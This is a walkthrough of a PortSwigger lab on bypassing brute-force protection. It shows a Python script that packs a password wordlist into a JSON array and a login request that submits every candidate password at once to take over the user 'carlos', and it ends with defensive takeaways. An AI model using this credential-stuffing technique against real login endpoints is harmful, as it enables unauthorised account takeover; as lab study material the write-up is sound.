#  Broken brute-force protection, multiple credentials per request

## 📌 Lab Details
- **Title**: Broken brute-force protection, multiple credentials per request
- **Difficulty**: Expert
- **Category**: Authentication
- **Lab URL**: https://portswigger.net/academy/labs/launch/dd916d2af3738d723a751992ee4fe00db3c6300559f2e7a5a7efb312d264caa0?referrer=%2fweb-security%2fauthentication%2fpassword-based%2flab-broken-brute-force-protection-multiple-credentials-per-request

## 🔍 Summary
The app accepts an array for the password JSON field and the server treats that input in a way that authenticates if any element is valid — sending many passwords at once lets you log in as the victim.

## 🛠 Steps to Solve
1. Notice that the POST `/login` request submits the login credentials in `JSON` format. Send this request to Burp Repeater.
2. Try replacing the string value of the password with an array of strings. The `200 OK` response shows that the request is being accepted.
3. Write a python script to convert the passwords into an array with **""**.
   ```sh
   print("[",end='')

   with open('passwords.txt','r') as f:
       lines=f.readlines()

   for pwd in lines:
       print('"'+pwd.rstrip("\n")+'",',end='')

   print('"random"]')
   ```
4. Replace the string value of the password with an array of strings containing all of the candidate passwords.
   ```sh
   "username" : "carlos",
   "password" : [
    "123456",
    "password",
    "qwerty"
    ...
    ]
   ```
5. Send the request. This will return a 302 response.
6. Right-click on this request and select **Show response in browser**. Copy the URL and load it in the browser. The page loads and you are logged in as carlos.
7. Click **My account** to access Carlos's account page and solve the lab.

## 📖 Key Takeaways
- **Input schema enforcement**: Validate JSON types server-side — require password to be a single string and reject arrays/objects.
- **Fail-fast on unexpected types**: Treat non-conforming requests as invalid instead of silently coercing or iterating.
- **Server-side validation + logging**: Use JSON schema or strong request parsers and log malformed/odd payloads for detection.

## 🖼️ Screenshot 
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/b66ed87b-e9ee-48ff-8456-e325ffab6587" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/a6d888a4-4717-4ca8-bd8c-7dee5f87d34b" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/82a8704d-ac79-49d3-a9d7-867439422b1a" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/850acae6-22cf-416e-b6c7-c203edc33ab9" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/b9a5ea45-57f2-4475-abc4-a0ca1c1d6c36" />
